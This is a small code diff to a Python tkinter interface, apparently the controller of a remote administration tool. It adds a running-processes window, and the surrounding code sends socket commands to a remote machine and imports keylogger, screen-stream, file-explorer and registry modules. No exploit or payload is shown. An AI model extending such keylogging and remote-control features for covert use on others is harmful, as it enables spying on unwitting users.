@@ -7,6 +7,7 @@ import ui.ui_screenStream as sc
 import ui.ui_keylogger as kl
 import ui.ui_fileExplorer as fe
 import ui.ui_registry as reg
+import ui.ui_runningProcesses as rp
 
 class UI_main(tk.Tk):
     def __init__(self):
@@ -112,7 +113,9 @@ class UI_main(tk.Tk):
         self.socket_cmd("runningApps")
 
     def runningProcesses(self):
-        self.socket_cmd("runningProcesses")
+        window = rp.UI_runningProcesses(self)
+        window.grab_set()
+        window.focus()
 
     def shutdown(self):
         if askokcancel(lb.SHUTDOWN, lb.SHUTDOWN_CONFIRM):
